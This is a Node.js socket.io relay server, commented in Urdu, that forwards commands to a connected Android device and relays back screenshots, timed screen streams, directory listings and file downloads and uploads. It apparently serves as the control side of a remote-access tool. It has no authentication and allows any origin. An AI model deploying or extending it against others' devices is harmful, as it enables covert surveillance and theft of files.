const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);

// مضبوط ساکٹ کنفیگریشن تاکہ بار بار ڈسکنیکٹ نہ ہو
const io = new Server(server, { 
    cors: { origin: "*" },
    maxHttpBufferSize: 1e9, // 1GB limit for files
    allowEIO3: true,
    pingTimeout: 60000,
    pingInterval: 25000
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

io.on('connection', (socket) => {
    console.log('🟢 Device connected:', socket.id);

    // --- لائیو ڈیبگ لاگز (اینڈرائیڈ سے آئیں گے) ---
    socket.on('app_debug_log', (msg) => {
        console.log(`📱 [APP LOG - ${socket.id}]:`, msg);
    });

    // --- سکرین کیپچر ---
    socket.on('send_screenshot', (data) => socket.broadcast.emit('receive_screenshot', data));
    socket.on('request_single_shot', () => socket.broadcast.emit('command_single_shot'));
    socket.on('request_timer_stream', (data) => socket.broadcast.emit('command_timer_stream', data));

    // --- فائل مینیجر ---
    socket.on('request_directory', (dirPath) => socket.broadcast.emit('command_get_directory', dirPath));
    socket.on('send_directory_list', (data) => socket.broadcast.emit('receive_directory_list', data));
    socket.on('request_download_file', (filePath) => socket.broadcast.emit('command_download_file', filePath));
    socket.on('send_file_data', (fileData) => socket.broadcast.emit('receive_file_data', fileData));
    socket.on('request_upload_file', (uploadData) => socket.broadcast.emit('command_upload_file', uploadData));

    // --- ڈسکنیکٹ ہونے کی وجہ ---
    socket.on('disconnect', (reason) => {
        console.log(`🔴 Device disconnected: ${socket.id} | Reason: ${reason}`);
    });
});

const PORT = process.env.PORT || 8080;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
